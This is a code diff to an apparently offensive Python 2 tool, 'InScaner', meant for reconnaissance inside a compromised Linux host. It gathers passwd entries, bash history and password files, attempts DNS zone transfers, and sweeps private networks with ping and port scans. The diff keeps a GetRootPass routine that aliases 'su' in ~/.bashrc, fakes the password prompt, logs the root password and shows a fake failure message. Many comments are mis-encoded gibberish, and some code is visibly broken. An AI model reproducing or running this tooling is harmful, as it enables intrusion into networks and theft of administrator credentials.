@@ -39,7 +39,7 @@ class InScaner:
         self.host_shadow = ''
         self.host_issue = ''
         self.host_bash_history = []
-        self.host_services = '' #Î´½øĞĞÊ¶±ğ
+        self.host_services = '' 
         self.host_ESTABLISHEDlink = ''
         self.host_hackCmd = []
         self.host_complie = []
@@ -55,7 +55,7 @@ class InScaner:
         self.keyip=[]
         self.keyipmaybe=[]
         self.networkmaybe=[]
-        self.network = []#192.168.1.0¸ñÊ½
+        self.network = []#192.168.1.0
         self.q = Queue()
         self.s = Queue()
         self.networkIPlistA = []
@@ -69,8 +69,8 @@ class InScaner:
         print self.host_ip+'\n'
         
         _hostcmdList = [
-                        'hostname',#Ö÷»úÃû
-                        'id',      #ÓÃ»§id
+                        'hostname',
+                        'id',
                         '''
                         cat /etc/passwd|grep -v nologin|grep -v halt|grep -v shutdown|awk -F":" '{ print $1"|"$3"|"$4}'
                         ''',
@@ -173,7 +173,7 @@ class InScaner:
             
                 
     def mgFileGet(self):
-        print '##########»ñÈ¡¿ÚÁîÃÜÂëÎÄ¼şÖĞ¡£¡£¡£¡£¡£¡£##########'
+        print '##########Get password file##########'
         
         print 'PHP'
         
@@ -265,9 +265,8 @@ class InScaner:
                     self.GetDomainList(dnsip,self.domain)
                 except:
                     print '##dns test failed##'
-        #»ñÈ¡DNSÓò´«ËÍĞÅÏ¢
+        #è·å–DNSåŸŸä¼ é€ä¿¡æ¯
         print '#####Network exist#####'
-        #ÏÈÊÕ¼¯ËùÓĞ½á¹ûÖĞµÄIPµØÖ·£¬È¥µôÅÅ³ıµÄipµØÖ·ºó£¬°ÑipµØÖ·×ª»»ÎªÍø¶Î£¬Ö®ºóÈ¥ÖØ£¬×îºó±£´æ
         ip = []
         keyip = []
         keyipmaybe =[]
@@ -313,10 +312,9 @@ class InScaner:
             elif type(text) == type(['1']):
                 for text2 in text:
                     ip+=self.__getIPinStr(text2)
-        [keyipmaybe.append(ipnew) for ipnew in ip if ipnew not in (keyipmaybe+_ex_ip)]#ipµØÖ·´¦Àí
+        [keyipmaybe.append(ipnew) for ipnew in ip if ipnew not in (keyipmaybe+_ex_ip)]
         self.keyipmaybe = keyipmaybe
         
-        #±äÁ¿ÖĞµÄIP²¢È¥ÖØ£¬È¥ÎŞĞ§IP
         ip = []
         for text in _iplistsearch:
             if type(text) == type('1'):
@@ -324,8 +322,8 @@ class InScaner:
             elif type(text) == type(['1']):
                 for text2 in text:
                     ip+=self.__getIPinStr(text2)
-        [keyip.append(ipnew) for ipnew in ip if ipnew not in (keyip+_ex_ip)]#ipµØÖ·´¦Àí
-        #½«IPµØÖ·×ª»»ÎªÍø¶Î£¬²¢È¥ÖØ
+        [keyip.append(ipnew) for ipnew in ip if ipnew not in (keyip+_ex_ip)]
+
         self.keyip = keyip
         
         _ex_network =[
@@ -340,7 +338,6 @@ class InScaner:
         for netip in self.keyip:
             network.append(self.__ip2network(netip))
             [keynetwork.append(net) for net in network if net not in keynetwork+_ex_network]
-        #É¸Ñ¡³öË½ÓĞIPµØÖ·
         _privatNet = [
                       '172',
                       '192',
@@ -387,11 +384,11 @@ class InScaner:
         q_type = 252    # Type AXFR = 252
         q_class = 1    # CLASS IN
         data += struct.pack('!HH', q_type, q_class)
-        data = struct.pack('!H', len(data) ) + data    # first 2 bytes should be length
+        data = struct.pack('!H', len(data) ) + data
         return data
     
     
-    __OFFvSET = 0    # Response Data offset
+    __OFFvSET = 0    
     __TYPES = {1: 'A', 2: 'NS', 5: 'CNAME', 6: 'SOA',
              12: 'PTR', 15: 'MX', 16: 'TXT',
              28: 'AAAA', 38: 'A6', 99: 'SPF',}
@@ -421,8 +418,7 @@ class InScaner:
                 ip = [str(num) for num in struct.unpack('!BBBB', response[__OFFSET+2: __OFFSET+6] ) ]
                 print name.ljust(20), type.ljust(10), '.'.join(ip)
             __OFFSET += 2 + data_length
-         
-    # is_pointer: an name offset or not        
+       
     def __get_name(self,response, name_offset, is_pointer=False):
         global __OFFSET
         labels = []
@@ -489,15 +485,13 @@ class InScaner:
         print '##########Start port scanning.....#########'
         print '###ip alive:###'
         if self.network == []:
-            print '!!!!sorry,IP is NULL £¡£¡£¡£¡£¡'
+            print '!!!!sorry,IP is NULL ï¼ï¼ï¼ï¼ï¼'
         else:
-            #µÃµ½ÒªpingµÄipÁĞ±í£º
             _pinglist = []
             for network in self.network:
                 for i in range(1,255):
                     _pinglist.append(self._int2ip(self._ip2int(network)+i))
         
-            #¿ªÊ¼Ö´ĞĞ
             for i  in range(self.NUM):
                 self.t = Thread(target = self.__pingScan)
                 self.t.setDaemon(True)
@@ -506,7 +500,6 @@ class InScaner:
             for ip in _pinglist:
                 self.q.put(ip)
             self.q.join()
-            #´òÓ¡É¨Ãè´æ»îIPÁĞ±í½á¹û,²¢¸ø¶Ë¿Ú¿ª·¢×Öµä¸³Öµ
             for ip in self.networkIPlistA:
                 self.networkIP_portOpen[ip]=''
                 print ip
@@ -525,39 +518,31 @@ class InScaner:
                 self.s.put(scan)
             self.s.join()
             
-            #print self.networkIP_portOpen
-            #´òÓ¡¶Ë¿ÚÉ¨Ãè½á¹û£º
             for ip in self.networkIPlistA:
                 portlist = self.networkIP_portOpen[ip].split(',')
                 #print portlist
                 for port in portlist:
                     if port != '':
                         print '%s:%s' % (ip,port)
-        #ÏÈping£¬ºóÖ±½Ó½øĞĞTCPÁ¬½ÓÉ¨Ãè
         print '##########Port scan finished##########'
-        print '####################ÍøÂçĞÅÏ¢»ñÈ¡½áÊø####################\n'
+        print '####################Finish####################\n'
         
     def PassScan(self,hostsIP,service,port,username,password):
-        #Ö§³Össh¡¢telnet¡¢ftp¡¢mysql¡¢oralce
+        #æ”¯æŒsshã€telnetã€ftpã€mysqlã€oralce
         print '##########Weak password scanning##########'
         return 
     
-    def GetRootPass(self): #²âÊÔÓÃÓÃ²»ÖªµÀºÃ²»ºÃÓÃ
+    def GetRootPass(self):
         _file = open('~/.bashrc','a')
-        _file.write("alias su=\¡¯%s+/root.py\'") % self.path
+        _file.write("alias su=\â€™%s+/root.py\'") % self.path
         _file.close()
         
         current_time = time.strftime("%Y-%m-%d %H:%M")  
-        _logfile="%s+.su.log" % self.path              #ÃÜÂë»ñÈ¡ºó¼ÇÂ¼ÔÚÕâÀï  
-        #CentOS                  
-        #fail_str = "su: incorrect password"  
-        #Ubuntu               
-        #fail_str = "su: Authentication failure"  
-        #For Linux Korea                    #centos,ubuntu,korea ÇĞ»»rootÓÃ»§Ê§°ÜÌáÊ¾²»Ò»Ñù  
+        _logfile="%s+.su.log" % self.path
         fail_str = "su: incorrect password" 
         try:  
             passwd = getpass.getpass(prompt='Password: ');
-            _file = open(_logfile,'a').write("[%s]t%s"%(passwd, current_time))#½ØÈ¡rootÃÜÂë  
+            _file = open(_logfile,'a').write("[%s]t%s"%(passwd, current_time))
             _file.write('\n')
             _file.close()
             
@@ -565,7 +550,7 @@ class InScaner:
             pass
         
         time.sleep(1)
-        print fail_str                               #´òÓ¡ÇĞ»»rootÊ§°ÜÌáÊ¾
+        print fail_str
         pass
     
     def Runall(self):
